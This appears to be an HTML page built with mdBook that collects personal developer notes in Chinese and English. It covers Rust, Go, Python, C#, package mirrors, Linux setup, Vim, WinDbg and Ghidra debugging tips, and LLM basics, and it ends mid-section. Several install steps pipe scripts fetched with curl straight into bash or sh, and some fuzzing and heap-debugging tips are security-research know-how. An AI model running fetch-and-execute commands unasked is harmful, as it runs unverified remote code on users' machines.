@@ -1,0 +1,1531 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title></title>
+                <meta name="robots" content="noindex" />
+                
+
+        <!-- Custom HTML head -->
+        
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+                <link rel="icon" href="favicon.svg">
+                        <link rel="shortcut icon" href="favicon.png">
+                <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+                <link rel="stylesheet" href="css/print.css" media="print">
+        
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+                <link rel="stylesheet" href="fonts/fonts.css">
+        
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+                <link rel="stylesheet" href="custom.css">
+        
+                <!-- MathJax -->
+        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+            </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="language.html"><strong aria-hidden="true">1.</strong> Lan</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rust.html"><strong aria-hidden="true">1.1.</strong> rust</a></li><li class="chapter-item expanded "><a href="golang.html"><strong aria-hidden="true">1.2.</strong> golang</a></li><li class="chapter-item expanded "><a href="python.html"><strong aria-hidden="true">1.3.</strong> python</a></li><li class="chapter-item expanded "><a href="csharp.html"><strong aria-hidden="true">1.4.</strong> csharp</a></li></ol></li><li class="chapter-item expanded "><a href="other.html"><strong aria-hidden="true">2.</strong> other</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="unix.html"><strong aria-hidden="true">2.1.</strong> unix</a></li><li class="chapter-item expanded "><a href="linux-arch.html"><strong aria-hidden="true">2.2.</strong> arch linux</a></li><li class="chapter-item expanded "><a href="bash.html"><strong aria-hidden="true">2.3.</strong> bash</a></li><li class="chapter-item expanded "><a href="tools.html"><strong aria-hidden="true">2.4.</strong> tools</a></li><li class="chapter-item expanded "><a href="qa.html"><strong aria-hidden="true">2.5.</strong> qa</a></li><li class="chapter-item expanded "><a href="llm.html"><strong aria-hidden="true">2.6.</strong> llm</a></li><li class="chapter-item expanded "><a href="ml.html"><strong aria-hidden="true">2.7.</strong> ml</a></li><li class="chapter-item expanded "><a href="django.html"><strong aria-hidden="true">2.8.</strong> django</a></li><li class="chapter-item expanded "><a href="emacs.html"><strong aria-hidden="true">2.9.</strong> emacs</a></li></ol></li><li class="chapter-item expanded "><a href="security.html"><strong aria-hidden="true">3.</strong> security</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="windbg_cheatsheet.html"><strong aria-hidden="true">3.1.</strong> _windbg_cheatsheet</a></li><li class="chapter-item expanded "><a href="re.html"><strong aria-hidden="true">3.2.</strong> re</a></li><li class="chapter-item expanded "><a href="fuzz.html"><strong aria-hidden="true">3.3.</strong> fuzz</a></li></ol></li><li class="chapter-item expanded "><a href="vt.html"><strong aria-hidden="true">4.</strong> vt</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SimpleVisorRead.html"><strong aria-hidden="true">4.1.</strong> simple_visor_read</a></li><li class="chapter-item expanded "><a href="vt-faq.html"><strong aria-hidden="true">4.2.</strong> vt-faq</a></li></ol></li></ol>            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                                            </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                                                <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                                                                        
+                    </div>
+                </div>
+
+                                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="lan"><a class="header" href="#lan">Lan</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><!-- ---
+title: Rust lang
+subtitle: rs
+date: 2020-10-14
+bigimg: [{src: "/primitives/img/unsplash-josiah-ingels.jpg", desc: "Path"}]
+--- -->
+<h1 id="how-to-write-test"><a class="header" href="#how-to-write-test">how to write test</a></h1>
+<pre><code class="language-rs">#[cfg(test)]
+mod tests {
+    use super::*;
+    #[test]
+    fn test_123() {
+        // ...
+    }
+}
+</code></pre>
+<pre><code class="language-rs">#[test]
+fn test_123() {
+    // ...
+}
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><!-- ---
+title: Golang
+subtitle: Golang
+date: 2021-02-24
+bigimg: [{src: "/primitives/img/unsplash-patrick-tomasso.jpg", desc: "Path"}]
+--- -->
+<h1 id="string-to-int"><a class="header" href="#string-to-int">string to int</a></h1>
+<p>Atoi (string to int) and Itoa (int to string).</p>
+<pre><code class="language-go">i, err := strconv.Atoi(&quot;-42&quot;)
+s := strconv.Itoa(-42)
+</code></pre>
+<h1 id="go-build-x86-on-x64"><a class="header" href="#go-build-x86-on-x64">go build x86 on x64</a></h1>
+<pre><code class="language-sh">GOARCH=386 GOOS=windows go build
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="run-direct--python-mainpy"><a class="header" href="#run-direct--python-mainpy">run direct | python main.py</a></h1>
+<pre><code class="language-py">import sys
+
+def main():
+   filepath = sys.argv[1]
+
+if __name__ == '__main__':
+    main() 
+</code></pre>
+<h1 id="md5"><a class="header" href="#md5">md5</a></h1>
+<pre><code class="language-py">import hashlib
+def md5(fname):
+    hash_md5 = hashlib.md5()
+    with open(fname, &quot;rb&quot;) as f:
+        for chunk in iter(lambda: f.read(4096), b&quot;&quot;):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+</code></pre>
+<h1 id="file"><a class="header" href="#file">file</a></h1>
+<pre><code class="language-py">outF = open(&quot;myOutFile.txt&quot;, &quot;w&quot;) # write (create new)
+outF = open(&quot;myOutFile.txt&quot;, &quot;a&quot;) # append
+
+# write
+
+outF.write(&quot;abc&quot;)
+outF.write(&quot;\n&quot;)
+outF.writelines([&quot;aa&quot;,&quot;bb&quot;]) # 写很多行
+
+# read
+outF.read(1024) # read 1024 bytes
+outF.read() # read all
+outF.readlines() # TODO
+
+# read line by line
+for cnt, line in enumerate(fp):
+    print(&quot;Line {}: {}&quot;.format(cnt, line))
+
+# close to clean up
+outF.close() # need to close
+
+
+# use context open
+with open(out_filename, 'w') as out_file:
+    out_file.write(&quot;xx&quot;)
+
+</code></pre>
+<h1 id="error"><a class="header" href="#error">error</a></h1>
+<pre><code class="language-py">try:
+  print(&quot;Hello&quot;)
+except NameError:
+  print(&quot;Variable x is not defined&quot;)
+except:
+  print(&quot;Something else went wrong&quot;)
+else:
+  print(&quot;Nothing went wrong&quot;) 
+finally:
+  print(&quot;The 'try except' is finished&quot;) 
+
+
+</code></pre>
+<h1 id="dir-directory"><a class="header" href="#dir-directory">dir (directory)</a></h1>
+<pre><code class="language-py">import os
+for dir in os.listdir():
+   pass
+
+</code></pre>
+<h1 id="subcommand"><a class="header" href="#subcommand">subcommand</a></h1>
+<p>一个运行命令的「框架」，带超时，同时捕获 stdout and stderr</p>
+<ul>
+<li><code>subcommand.run</code> 的第一个参数必须是数组</li>
+<li>timeout单位是秒</li>
+<li>stdout=PIPE, stderr=STDOUT的作用是把stderr重定向到stdout，stdout可以通过后续拿到</li>
+</ul>
+<pre><code class="language-py">import os
+import subprocess
+from subprocess import *
+for line in outfile:
+    try:
+        i = i+1
+        print(&quot;runing#{} {}&quot;.format(i,line))
+        sr = subprocess.run([&quot;rabin2&quot;, &quot;-I&quot;, line[:-1]], timeout=4, stdout=PIPE, stderr=STDOUT)
+        print(sr.stdout.decode(&quot;utf-8&quot;))
+    except subprocess.TimeoutExpired:
+        print(&quot;timeout&quot;)
+    except:
+        print(&quot;unknow error&quot;)
+</code></pre>
+<h1 id="python2-subprocess"><a class="header" href="#python2-subprocess">python2 subprocess</a></h1>
+<p>https://stackoverflow.com/a/4760517</p>
+<p>期望信息：stdout，stderr，status</p>
+<pre><code>import subprocess
+p = subprocess.Popen(['ls', '-a'], stdout=subprocess.PIPE, 
+                                   stderr=subprocess.PIPE)
+out, err = p.communicate()
+status = p.returncode
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="build-from-cli"><a class="header" href="#build-from-cli">build from cli</a></h1>
+<p>打开 visual studio prompt</p>
+<pre><code>csc a.cs
+</code></pre>
+<pre><code class="language-cs">using System;
+namespace HelloWorldApplication
+{
+   class HelloWorld
+   {
+      static void Main(string[] args)
+      {
+         Console.WriteLine(&quot;Hello World&quot;);
+         Console.ReadKey();
+      }
+   }
+}
+</code></pre>
+<h1 id="fmt-format-string"><a class="header" href="#fmt-format-string">fmt format string</a></h1>
+<pre><code class="language-c#">string.Format(&quot;blabla: {0}&quot;, 123);
+string.Format(&quot;blabla: {0:d}&quot;, 123);
+</code></pre>
+<h1 id="switch"><a class="header" href="#switch">switch</a></h1>
+<pre><code class="language-c#">switch (somevar) 
+{
+	case 123:
+		// do something
+		// do more, no need bracket
+		break;
+	case 456:
+	case 457:
+		break;
+	default:
+		break;
+}
+</code></pre>
+<h1 id="file-1"><a class="header" href="#file-1">file</a></h1>
+<pre><code class="language-csharp">// read file
+string content = File.ReadAllText(path, Encoding.UTF8);
+
+// write file
+File.WriteAllText(curFile, &quot;blabla&quot;);
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="other"><a class="header" href="#other">other</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="frequently"><a class="header" href="#frequently">frequently</a></h1>
+<h2 id="pip"><a class="header" href="#pip">pip</a></h2>
+<pre><code>-i https://pypi.douban.com/simple/
+</code></pre>
+<pre><code>-i https://pypi.tuna.tsinghua.edu.cn/simple
+</code></pre>
+<h2 id="go"><a class="header" href="#go">go</a></h2>
+<p>启用 Go Modules 功能</p>
+<pre><code>go env -w GO111MODULE=on
+</code></pre>
+<p>七牛</p>
+<pre><code>go env -w  GOPROXY=https://goproxy.cn,direct
+</code></pre>
+<p>阿里云</p>
+<pre><code>go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct
+</code></pre>
+<p>goproxy</p>
+<pre><code>go env -w  GOPROXY=https://goproxy.io,direct
+</code></pre>
+<p>查看：</p>
+<p>go env | grep GOPROXY</p>
+<p>安装：</p>
+<pre><code>curl https://dl.google.com/go/go1.23.4.linux-amd64.tar.gz -O
+sudo rm -rf /usr/local/go &amp;&amp; sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+</code></pre>
+<h2 id="npm"><a class="header" href="#npm">npm</a></h2>
+<pre><code>--registry=https://registry.npm.taobao.org
+</code></pre>
+<h2 id="cargo"><a class="header" href="#cargo">cargo</a></h2>
+<p>在 <code>$HOME/.cargo/config</code> 中添加如下内容：</p>
+<pre><code># ~/.cargo/config
+[source.crates-io]
+replace-with = 'rsproxy-sparse'
+[source.rsproxy]
+registry = &quot;https://rsproxy.cn/crates.io-index&quot;
+[source.rsproxy-sparse]
+registry = &quot;sparse+https://rsproxy.cn/index/&quot;
+[registries.rsproxy]
+index = &quot;https://rsproxy.cn/crates.io-index&quot;
+[net]
+git-fetch-with-cli = true
+
+</code></pre>
+<p>或者：</p>
+<pre><code>[source.crates-io]
+replace-with = 'ustc'
+
+# 如果所处的环境中不允许使用 git 协议，可以把上述地址改为：
+
+[source.ustc]
+registry = &quot;https://mirrors.ustc.edu.cn/crates.io-index&quot;
+# registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;
+
+
+</code></pre>
+<h2 id="install-docker"><a class="header" href="#install-docker">install docker</a></h2>
+<pre><code>curl -fsSL https://get.docker.com | bash -s docker
+</code></pre>
+<h2 id="rustup-install-rust"><a class="header" href="#rustup-install-rust">rustup (install rust)</a></h2>
+<pre><code class="language-sh">curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+</code></pre>
+<p>使用代理：</p>
+<pre><code>export RUSTUP_DIST_SERVER=&quot;https://rsproxy.cn&quot;
+export RUSTUP_UPDATE_ROOT=&quot;https://rsproxy.cn/rustup&quot;
+curl --proto '=https' --tlsv1.2 -sSf https://rsproxy.cn/rustup-init.sh | sh
+</code></pre>
+<h2 id="nvm"><a class="header" href="#nvm">nvm</a></h2>
+<pre><code class="language-sh">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | bash
+</code></pre>
+<h2 id="ubuntu"><a class="header" href="#ubuntu">ubuntu</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"/>
+<a href="./sources/ubuntu-source.html">ubuntu-source</a></li>
+</ul>
+<h2 id="git"><a class="header" href="#git">git</a></h2>
+<ul>
+<li><code>git log -p main.c</code>
+看单个文件的git历史记录</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="kde部分应用中文输入"><a class="header" href="#kde部分应用中文输入">kde部分应用中文输入</a></h1>
+<p>使用 Fcitx 之前，您必须先设置一些环境设定变量：</p>
+<p>如果您用 KDM, GDM, LightDM 等显示管理器，请在 ~/.xprofile 中加入以下代码；如果您用 startx 或者 Slim 启动，即使用 .xinitrc 的场合，则改在 ~/.xinitrc 中加入：</p>
+<pre><code class="language-sh">export GTK_IM_MODULE=fcitx
+export QT_IM_MODULE=fcitx
+export XMODIFIERS=&quot;@im=fcitx&quot; 
+</code></pre>
+<p>http://newstart.farbox.com/post/articles/fcitx</p>
+<h1 id="mysql"><a class="header" href="#mysql">mysql</a></h1>
+<p>https://wiki.archlinux.org/index.php/MariaDB</p>
+<p>已经设置了一个用户kk</p>
+<pre><code>MariaDB [xxx]&gt; GRANT ALL ON xxx.* TO 'kk'@'127.0.0.1' IDENTIFIED BY 'sss' WITH GRANT OPTION;
+</code></pre>
+<h1 id="kde-shortcut"><a class="header" href="#kde-shortcut">kde shortcut</a></h1>
+<p><code>C-:</code>  choise pasteboard history </p>
+<h1 id="wireguard"><a class="header" href="#wireguard">wireguard</a></h1>
+<p>配置文件放在 <code>/etc/wireguard/wg0.conf</code> 里面
+使用 <code>wg-quick up wg0</code> 来启用 Interface, 使用 <code>wg-quick down wg0</code> 来关闭。</p>
+<p>使用 <code>systemctl enable wg-quick@wg0</code> 来自动启动。 </p>
+<p><a href="https://wiki.archlinux.org/index.php/WireGuard_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">arch-wiki</a></p>
+<h1 id="route-how-to-use-two-card-not-worked"><a class="header" href="#route-how-to-use-two-card-not-worked">route: how to use two card (not worked)</a></h1>
+<pre><code class="language-bash">route add -net 192.168.62.0 netmask 255.255.255.0 gw 192.168.1.1
+
+
+route add -net 10.10.40.0 netmask 255.255.255.0 gw 10.10.30.1
+
+http://10.10.40.11
+
+10.10.30.164
+wlp0s20f0u11
+
+ip route add 10.10.40.0/24 via 10.10.30.164 dev wlp0s20f0u11
+
+
+
+# ok
+~/w/tmp [2]&gt; sudo ip route del default via 192.168.0.1
+[sudo] xx 的密码：
+~/w/tmp&gt; ping 10.10.40.11
+PING 10.10.40.11 (10.10.40.11) 56(84) bytes of data.
+
+
+sudo ip route add 10.10.40.0/24 via 10.10.30.254 dev wlp0s20f0u11
+
+</code></pre>
+<h1 id="yay-cache"><a class="header" href="#yay-cache">yay cache</a></h1>
+<p>err: HTTP server doesn't seem to support byte ranges. Cannot resume
+忽略缓存下载: 在询问clean build的时候选择ALL</p>
+<pre><code>==&gt; Packages to cleanBuild?
+==&gt; [N]one [A]ll [Ab]ort [I]nstalled [No]tInstalled or (1 2 3, 1-3, ^4)
+==&gt;
+
+</code></pre>
+<h1 id="firefox"><a class="header" href="#firefox">firefox</a></h1>
+<h2 id="change-scroll-bar-to-left"><a class="header" href="#change-scroll-bar-to-left">change scroll bar to left</a></h2>
+<ol>
+<li>input<code>about:config</code> in address bar</li>
+<li>search and change <code>layout.scrollbar.side</code> to 3</li>
+<li>restart(must?)</li>
+</ol>
+<h1 id="vnc"><a class="header" href="#vnc">vnc</a></h1>
+<p>black screen use the default config</p>
+<p>https://www.reddit.com/r/ManjaroLinux/comments/g7vs5i/black_screen_when_i_vnc_into_manjaro_guest_kde/
+Deleted everything in the <code>~/.vnc/xstartup</code> file and added
+<code>dbus-launch startplasma-x11</code></p>
+<pre><code class="language-sh">vncserver -geometry 1600x1200 -randr 1600x1200,1440x900,1024x768
+xrandr
+xrandr -s 800x600
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="bash"><a class="header" href="#bash">bash</a></h1>
+<h2 id="循环做事"><a class="header" href="#循环做事">循环做事</a></h2>
+<pre><code class="language-sh">#TLDR
+
+for i in {1..10}; do echo &quot;abc&quot;; done;
+
+# example
+for i in {1000..3000}; do for f in example.*; do zzuf -r 0.01 -s $i &lt; &quot;$f&quot; &gt; &quot;$i-$f&quot;; done; done
+
+
+</code></pre>
+<h2 id="stdout-and-stderr-pipe-to-both-terminal-and-file"><a class="header" href="#stdout-and-stderr-pipe-to-both-terminal-and-file">stdout and stderr pipe to both terminal and file</a></h2>
+<pre><code class="language-sh">sh any.sh 2&gt;&amp;1 | tee output.txt
+sh any.sh 2&gt;&amp;1 | tee -a output.txt
+</code></pre>
+<h2 id="上次命令的返回状态"><a class="header" href="#上次命令的返回状态">上次命令的返回状态</a></h2>
+<pre><code class="language-sh">echo $?
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vim"><a class="header" href="#vim">vim</a></h1>
+<h2 id="basic-settings"><a class="header" href="#basic-settings">basic settings</a></h2>
+<h2 id="限制最大列数"><a class="header" href="#限制最大列数">限制最大列数</a></h2>
+<pre><code class="language-vimrc">:set colorcolumn=80
+</code></pre>
+<h2 id="python-tabs"><a class="header" href="#python-tabs">python tabs</a></h2>
+<pre><code class="language-vimrc">set expandtab           &quot; enter spaces when tab is pressed
+set textwidth=120       &quot; break lines when line length increases
+set tabstop=4           &quot; use 4 spaces to represent tab
+set softtabstop=4
+set shiftwidth=4        &quot; number of spaces to use for auto indent
+set autoindent          &quot; copy indent from current line when starting a new line
+&quot; make backspaces more powerfull
+set backspace=indent,eol,start
+</code></pre>
+<h2 id="vim-plug"><a class="header" href="#vim-plug">vim-plug</a></h2>
+<h3 id="install"><a class="header" href="#install">install</a></h3>
+<pre><code>curl -fLo ~/.vim/autoload/plug.vim --create-dirs \
+    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
+</code></pre>
+<h3 id="config"><a class="header" href="#config">config</a></h3>
+<pre><code>call plug#begin('~/.vim/plugged')
+
+Plug 'scrooloose/nerdtree', { 'on': 'NERDTreeToggle' }
+
+call plug#end()
+</code></pre>
+<p>then <code>:source %</code>  and <code>:PlugInstall</code></p>
+<h3 id="cocnvim"><a class="header" href="#cocnvim">coc.nvim</a></h3>
+<p>install node</p>
+<pre><code class="language-sh">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | bash
+nvm install 11
+</code></pre>
+<p>edit <code>~/.vimrc</code></p>
+<pre><code>Plug 'neoclide/coc.nvim', {'branch': 'release'}
+</code></pre>
+<p><code>:PlugInstall</code></p>
+<p>edit <code>~/.vimrc</code></p>
+<pre><code>&quot; GoTo code navigation.
+nmap &lt;silent&gt; gd &lt;Plug&gt;(coc-definition)
+nmap &lt;silent&gt; gy &lt;Plug&gt;(coc-type-definition)
+nmap &lt;silent&gt; gi &lt;Plug&gt;(coc-implementation)
+nmap &lt;silent&gt; gr &lt;Plug&gt;(coc-references)
+
+&quot; Use K to show documentation in preview window.
+nnoremap &lt;silent&gt; K :call &lt;SID&gt;show_documentation()&lt;CR&gt;
+
+function! s:show_documentation()
+  if (index(['vim','help'], &amp;filetype) &gt;= 0)
+    execute 'h '.expand('&lt;cword&gt;')
+  elseif (coc#rpc#ready())
+    call CocActionAsync('doHover')
+  else
+    execute '!' . &amp;keywordprg . &quot; &quot; . expand('&lt;cword&gt;')
+  endif
+endfunction
+</code></pre>
+<h3 id="cc"><a class="header" href="#cc">C/C++</a></h3>
+<pre><code class="language-sh">apt install ccls
+</code></pre>
+<p>edit config file via <code>:CocConfig</code></p>
+<pre><code class="language-json">{
+  &quot;languageserver&quot;: {
+    &quot;ccls&quot;: {
+      &quot;command&quot;: &quot;ccls&quot;,
+      &quot;filetypes&quot;: [&quot;c&quot;, &quot;cpp&quot;, &quot;cuda&quot;, &quot;objc&quot;, &quot;objcpp&quot;],
+      &quot;rootPatterns&quot;: [&quot;.ccls-root&quot;, &quot;compile_commands.json&quot;],
+      &quot;initializationOptions&quot;: {
+        &quot;cache&quot;: {
+          &quot;directory&quot;: &quot;.ccls-cache&quot;
+        },
+        &quot;client&quot;: {
+          &quot;snippetSupport&quot;: true
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><p><img src="assets/2023-08-07-10-13-43.png" alt="" /></p>
+<p>Q: 如何修改内存？</p>
+<p>这里的d是修改的宽度</p>
+<pre><code>ed 0xe750f50 42424242
+</code></pre>
+<p>Q: ghidra rebase program</p>
+<p>To rebase a binary in Ghidra via the GUI: Window -&gt; Memory Map -&gt; Set Image Base button (far right house icon).
+https://twitter.com/_argp/status/1167359147211251713</p>
+<p>Q: ghidra 高亮变量</p>
+<p>鼠标中键
+https://github.com/NationalSecurityAgency/ghidra/issues/25</p>
+<p>Q: 搜索内存：</p>
+<p>0:013&gt;  s -a 0 L?80000000 &quot;defines Annotatio&quot;
+0ac44ce3  64 65 66 69 6e 65 73 20-41 6e 6e 6f 74 61 74 69  defines Annotati
+0e63a0e2  64 65 66 69 6e 65 73 20-41 6e 6e 6f 74 61 74 69  defines Annotati
+0e90414c  64 65 66 69 6e 65 73 20-41 6e 6e 6f 74 61 74 69  defines Annotati</p>
+<p>Q: gflags</p>
+<p>&quot;D:\Windows Kits\10\Debuggers\x86\gflags.exe&quot;  -i FoxitPDFReader.exe +hpa</p>
+<p>实验：在win10上，搜索内存反查，失败，heap指令不生效就算用老版+hpa也不行</p>
+<p>Q: 格式化打印</p>
+<p>.printf &quot;filename: %mu \n&quot;, poi(@esp+4)</p>
+<ul>
+<li>宽字符串 %mu</li>
+<li>字符串  %ma</li>
+</ul>
+<p>和断点结合，需要对冒号和反斜杠进行转义</p>
+<p>bp kernel32!CreateFileW &quot;.printf &quot;filename: %mu \n&quot;, poi(@esp+4);kv;gc;&quot;</p>
+<p>Q: 条件断点之字符串</p>
+<p>实例：打开某个特定文件名时断下</p>
+<pre><code>bp kernel32!CreateFileW &quot;as /mu $FileName poi(@esp+0x4);.block{r @$t0=$scmp(@\&quot;$FileName\&quot;, @\&quot;G:\\clean\\2023-07\\2023-07-21-mesos\\mesos-master\\links_highlights_annots.pdf\&quot;);.if(0!=@$t0){gc;}}&quot;
+</code></pre>
+<p>Q: 使用 drrun.exe 收集</p>
+<pre><code>G:\clean\2023-07\2023-07-cov-ghidra&gt;D:\working\wafl-play\DynamoRIO-Windows-8.0.18752\bin64\drrun.exe -t drcov -- test_cov.exe
+</code></pre>
+<p>Q: 显示某个地址对应的函数</p>
+<pre><code>0:000&gt; uf 751318fc
+KERNEL32!_imp__SleepEx:
+751318fc 40              inc     eax
+751318fd c3              ret
+0:000&gt; uf 751318fd
+KERNEL32!_imp__SleepEx+0x1:
+751318fd c3              ret
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="gpt的推理训练fine-tuning分别是什么意思"><a class="header" href="#gpt的推理训练fine-tuning分别是什么意思">gpt的推理、训练、fine-tuning分别是什么意思</a></h1>
+<p>The terms &quot;inference,&quot; &quot;training,&quot; and &quot;fine-tuning&quot; are fundamental concepts in the field of machine learning and natural language processing. Here's a detailed explanation of each term:</p>
+<p>术语“推理”、“训练”和“微调”是机器学习和自然语言处理领域的基本概念。 以下是每个术语的详细解释：</p>
+<p>推理：
+含义： 推理是指使用经过训练的模型根据新的输入数据进行预测或生成输出的过程。 当模型被部署并用于执行回答问题、完成提示或生成文本等任务时，它正在参与推理。
+示例： 使用 GPT-3 等预先训练的语言模型来生成类似人类的文本来响应给定的提示，这就是推理的一个示例。</p>
+<p>训练：
+含义： 训练涉及通过向机器学习模型提供大量标记数据并允许其学习数据中的模式和关系来教授机器学习模型的过程。 该模型在训练期间调整其内部参数，以最小化其预测与训练数据中的实际标签之间的差异。
+示例： 在文本段落数据集上训练语言模型，以学习人类语言的统计模式和结构。</p>
+<p>微调：
+含义： 微调，也称为<strong>迁移学习</strong>，涉及采用预先训练的模型并在特定数据集或任务上对其进行进一步训练，以使其适应新领域或提高其在特定类型数据上的性能。
+示例： 在包含火星城市信息的数据集上微调 GPT-3 等预训练语言模型，使其能够针对有关火星城市的问题生成准确且相关的答案。</p>
+<p>https://devv.ai/en/search?threadId=d669udyldpmo</p>
+<h1 id="lora"><a class="header" href="#lora">LoRA</a></h1>
+<h1 id="quantization-量化"><a class="header" href="#quantization-量化">quantization (量化）</a></h1>
+<blockquote>
+<p>context:
+You can run 70B LLAMA on dual 4090s/3090s with quantization.</p>
+</blockquote>
+<blockquote>
+<p>context 2:
+No, they can't run it. llama 70 with 4 bit quantization takes ~50 GB VRAM for decent enough context size. You need A100, or 2-3 V100 or 4 3090 which all costs roughly roughly $3-5/h</p>
+</blockquote>
+<h1 id="ggml-和-gguf"><a class="header" href="#ggml-和-gguf">GGML 和 GGUF</a></h1>
+<p>GGML 是创建用于存储 GPT 模型的文件格式的早期尝试。</p>
+<p>GGUF 旨在解决 GGML 的局限性并改善整体用户体验。</p>
+<blockquote>
+<p>GGUF是一种二进制格式，旨在实现快速加载和保存大语言模型，并易于阅读。原来模型是用pytorch保存, 我有的时候也转换成onnx. 但是,想在LLAMA.CPP上跑, 就要用GGUF格式.</p>
